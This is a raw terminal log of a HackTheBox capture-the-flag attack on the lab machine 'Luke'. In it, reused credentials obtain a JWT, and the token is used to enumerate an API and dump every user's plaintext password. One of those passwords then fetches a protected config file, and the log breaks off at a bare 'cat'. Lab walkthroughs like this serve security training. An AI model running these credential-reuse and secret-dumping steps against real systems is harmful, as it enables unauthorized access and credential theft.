@@ -1,0 +1,310 @@
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl http://root:Zk6heYCyv6ZE9Xcg@10.10.10.137/login                       
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">                               
+<html><head>                            
+<title>404 Not Found</title>            
+</head><body>                           
+<h1>Not Found</h1>                      
+<p>The requested URL /login was not found on this server.</p>                    
+</body></html>                          
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl http://root:Zk6heYCyv6ZE9Xcg@10.10.10.137:3000/login                  
+"please auth"┌─[root@parrot]─[~/hackthebox/luke]                                 
+└──╼ #curl -XPOST http://10.10.10.137:3000 -d 'username=admin&password=Zk6heYCyv6ZE9Xcg'                                                                          
+<!DOCTYPE html>                         
+<html lang="en">                        
+<head>                                  
+<meta charset="utf-8">                  
+<title>Error</title>                    
+</head>                                 
+<body>                                  
+<pre>Cannot POST /</pre>                
+</body>                                 
+</html>                                 
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -XPOST http://10.10.10.137:3000/login -d 'username=admin&password=Zk6heYCyv6ZE9Xcg'                                                                    
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NjU3LCJleHAiOjE1NzgxMzEwNTd9.gs3vnSrlda1CDvlgxC2jG7Nt1vVpRASDIOmqMbQiL0Y"}┌─[root@parrot]─[~/hackthebox/luke]                                                                      
+└──╼ #curl -XPOST http://10.10.10.137:3000/login -d 'username=admin&password=Zk6heYCyv6ZE9Xcg' ; echo                                                             
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o"}                        
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #vi auth-output                                                                                                                                              
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 | base64 -d                   
+{"alg":"HS256","typ":"JWT"}┌─[root@parrot]─[~/hackthebox/luke]                   
+└──╼ #echo -n eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleHAiOjE1NzgxMzExMzl9 | base64 -d                                                                
+{"username":"admin","iat":1578044739,"exp":1578131139}┌─[root@parrot]─[~/hackthebox/luke]                                                                         
+└──╼ #echo -n wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o | wc -c                
+43                                      
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #echo -n wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o= | base64 -d                                                                                            
+ybй                                     
+   vB7PxGDbase64: invalid input         
+┌─[✗]─[root@parrot]─[~/hackthebox/luke] 
+└──╼ #vi auth-output                    
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #vi auth-output                    
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #vi auth-output                    
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #vi auth-output                    
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #                                  
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #cat auth-output                                                                                                                                             
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o"}                        
+
+
+checking base64 -d of 3 parts           
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9            {"alg":"HS256","typ":"JWT"}      
+^ information about the token algo used for signing                              
+
+eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleHAiOjE1NzgxMzExMzl9        {"username":"admin","iat":1578044739,"exp":1578131139}                            
+^ Data                                  
+
+wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o   --                                 
+^ signature                             
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl http://10.10.10.137/ -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' ; echo                        
+<!DOCTYPE html>                         
+<html lang="en">                        
+
+<head>                                  
+
+  <meta charset="utf-8">                
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">                                                                          
+  <meta name="description" content="">  
+  <meta name="author" content="">       
+
+  <title>Luke</title>                   
+
+  <!-- Bootstrap core CSS -->           
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">          
+
+  <!-- Custom styles for this template -->                                       
+  <link href="css/scrolling-nav.css" rel="stylesheet">                           
+
+</head>                                 
+
+<body id="page-top">                    
+
+  <!-- Navigation -->                   
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top" id="mainNav">                                                                                
+    <div class="container">             
+      <a class="navbar-brand js-scroll-trigger" href="#page-top">Luke</a>        
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">          
+        <span class="navbar-toggler-icon"></span>                                
+      </button>                         
+      <div class="collapse navbar-collapse" id="navbarResponsive">               
+        <ul class="navbar-nav ml-auto"> 
+          <li class="nav-item">         
+            <a class="nav-link js-scroll-trigger" href="#about">About</a>        
+          </li>                         
+          <li class="nav-item">         
+            <a class="nav-link js-scroll-trigger" href="#services">Services</a>  
+          </li>                         
+          <li class="nav-item">         
+            <a class="nav-link js-scroll-trigger" href="#contact">Contact</a>    
+          </li>                         
+        </ul>                           
+      </div>                            
+    </div>                              
+  </nav>                                
+
+  <header class="bg-primary text-white">                                         
+    <div class="container text-center"> 
+      <h1>Welcome to Luke LTD</h1>      
+      <p class="lead">A landing page template freshly redesigned for Bootstrap 4</p>                                                                              
+    </div>                              
+  </header>                             
+
+  <section id="about">                  
+    <div class="container">             
+      <div class="row">                 
+        <div class="col-lg-8 mx-auto">  
+          <h2>About this page</h2>      
+          <p class="lead">This is the beginning of our website </p>              
+          <ul>                          
+          </ul>                         
+        </div>                          
+      </div>                            
+    </div>                              
+  </section>                            
+
+  <section id="services" class="bg-light">                                       
+    <div class="container">             
+      <div class="row">                 
+        <div class="col-lg-8 mx-auto">  
+          <h2>Services we offer</h2>    
+          <p class="lead">IT services like Network installation or Web Designing </p>                                                                             
+        </div>                          
+      </div>                            
+    </div>                              
+  </section>                            
+
+  <section id="contact">                
+    <div class="container">             
+      <div class="row">                 
+        <div class="col-lg-8 mx-auto">  
+          <h2>Contact us</h2>           
+          <p class="lead">contact@luke.io</p>                                    
+        </div>                          
+      </div>                            
+    </div>                              
+  </section>                            
+
+  <!-- Footer -->                       
+  <footer class="py-5 bg-dark">         
+    <div class="container">             
+      <p class="m-0 text-center text-white">Copyright &copy; Luke LTD 2019</p>   
+    </div>                              
+    <!-- /.container -->                
+  </footer>                             
+
+  <!-- Bootstrap core JavaScript -->    
+  <script src="vendor/jquery/jquery.min.js"></script>                            
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>            
+
+  <!-- Plugin JavaScript -->            
+  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>              
+
+  <!-- Custom JavaScript for this theme -->                                      
+  <script src="js/scrolling-nav.js"></script>                                    
+
+</body>                                 
+
+</html>                                 
+
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl http://10.10.10.137:3000/ -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleHAiOjE1Nz
+gxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' ; echo                                                                                                    
+{"message":"Welcome admin ! "}          
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl http://10.10.10.137:3000/users -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleHAiO
+jE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq                                                                                                 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
+                                 Dload  Upload   Total   Spent    Left  Speed    
+100   181  100   181    0     0    378      0 --:--:-- --:--:-- --:--:--   378   
+[                                       
+  {                                     
+    "ID": "1",                          
+    "name": "Admin",                    
+    "Role": "Superuser"                 
+  },                                    
+  {                                     
+    "ID": "2",                          
+    "name": "Derry",                    
+    "Role": "Web Admin"                 
+  },                                    
+  {                                     
+    "ID": "3",                          
+    "name": "Yuri",                     
+    "Role": "Beta Tester"               
+  },                                    
+  {                                     
+    "ID": "4",                          
+    "name": "Dory",                     
+    "Role": "Supporter"                 
+  }                                     
+]                                       
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJleH
+AiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq                                                                                              
+[                                       
+  {                                     
+    "ID": "1",                          
+    "name": "Admin",                    
+    "Role": "Superuser"                 
+  },                                    
+  {                                     
+    "ID": "2",                          
+    "name": "Derry",                    
+    "Role": "Web Admin"                 
+  },                                    
+  {                                     
+    "ID": "3",                          
+    "name": "Yuri",                     
+    "Role": "Beta Tester"               
+  },                                    
+  {                                     
+    "ID": "4",                          
+    "name": "Dory",                     
+    "Role": "Supporter"                 
+  }                                     
+]                                       
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users/1 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5LCJl
+eHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq                                                                                            
+parse error: Invalid numeric literal at line 1, column 10                        
+┌─[✗]─[root@parrot]─[~/hackthebox/luke] 
+└──╼ #curl -s http://10.10.10.137:3000/users/Admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5
+LCJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq                                                                                        
+{                                       
+  "name": "Admin",                      
+  "password": "WX5b7)>/rp$U)FW"         
+}                                       
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users/Derry -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5
+LCJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq                                                                                        
+{                                       
+  "name": "Derry",                      
+  "password": "rZ86wwLvx7jUxtch"        
+}                                       
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users/Yuri -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5L
+CJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq                                                                                         
+{                                       
+  "name": "Yuri",                       
+  "password": "bet@tester87"            
+}                                       
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users/Dory -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5L
+CJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq                                                                                         
+{                                       
+  "name": "Dory",                       
+  "password": "5y:!xa=ybfe)/QD"         
+}                                       
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users/Derry -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5
+LCJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq >> Auth-cred                                                                           
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users/Dory -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5L
+CJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq >> Auth-cred                                                                            
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #curl -s http://10.10.10.137:3000/users/Yuri -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTc4MDQ0NzM5L
+CJleHAiOjE1NzgxMzExMzl9.wep586diiaf3vtC5DL2PdgBCN7vQUJ14HatHRE_z26o' | jq >> Auth-cred                                                                            
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #^C                                
+┌─[✗]─[root@parrot]─[~/hackthebox/luke] 
+└──╼ #wget http://10.10.10.137/management/config.json                            
+--2020-01-03 05:18:48--  http://10.10.10.137/management/config.json              
+Connecting to 10.10.10.137:80... connected.                                      
+HTTP request sent, awaiting response... 401 Unauthorized                         
+
+Username/Password Authentication Failed.                                         
+┌─[✗]─[root@parrot]─[~/hackthebox/luke] 
+└──╼ #wget  http://10.10.10.137:3000/management/config.json --user='Derry' --password='rZ86wwLvx7jUxtch'                                                          
+--2020-01-03 05:23:26--  http://10.10.10.137:3000/management/config.json         
+Connecting to 10.10.10.137:3000... connected.                                    
+HTTP request sent, awaiting response... 404 Not Found                            
+2020-01-03 05:23:27 ERROR 404: Not Found.                                        
+
+┌─[✗]─[root@parrot]─[~/hackthebox/luke] 
+└──╼ #wget  http://10.10.10.137/management/config.json --user='Derry' --password='rZ86wwLvx7jUxtch'                                                               
+--2020-01-03 05:23:46--  http://10.10.10.137/management/config.json              
+Connecting to 10.10.10.137:80... connected.                                      
+HTTP request sent, awaiting response... 401 Unauthorized                         
+Authentication selected: Basic realm="Authentification required ! Forbidden to visitors .."                                                                       
+Reusing existing connection to 10.10.10.137:80.                                  
+HTTP request sent, awaiting response... 200 OK                                   
+Length: 2657 (2.6K) [application/json]  
+Saving to: ‘config.json’                
+
+config.json                              100%[================================================================================>]   2.59K  --.-KB/s    in 0.002s   
+
+2020-01-03 05:23:46 (1.54 MB/s) - ‘config.json’ saved [2657/2657]                
+
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #ls                                
+Auth-cred  auth-output  config.json  credential  ftp  gobuster-out  nmap         
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #cat                               
